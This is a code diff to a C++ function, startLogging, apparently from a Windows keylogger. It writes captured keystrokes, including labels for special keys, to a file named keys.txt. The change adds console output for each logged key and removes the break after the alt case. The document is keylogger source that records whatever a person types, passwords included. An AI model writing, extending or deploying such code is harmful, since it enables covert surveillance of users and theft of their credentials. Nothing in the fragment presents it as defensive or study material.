@@ -23,34 +23,49 @@ void startLogging(){
                 // cout << c;
                 ofstream keys;
                 keys.open("keys.txt", ios::app);
+                const char* key;
                 switch (c) {
                     case VK_BACK:
-                        keys << "[backspace]";
+                        key = "[backspace]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_RETURN:
-                        keys << "[enter]";
+                        key = "[enter]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_SHIFT:
-                        keys << "[shift]";
+                        key = "[shift]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_CONTROL:
-                        keys << "[ctrl]";
+                        key = "[ctrl]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_CAPITAL:
-                        keys << "[caps]";
+                        key = "[caps]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_TAB:
-                        keys << "[tab]";
+                        key = "[tab]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                         break;
                     case VK_MENU:
-                        keys << "[alt]";
-                        break;
+                        key = "[alt]";
+                        keys << key;
+                        std::cout << "Logged " << key << std::endl;
                     case VK_LBUTTON:
                         break;
                     case VK_RBUTTON:
                         break; 
                     default:
                         keys << c;   
+                        std::cout << "Logged " << c << std::endl;
                 }
                 
             }
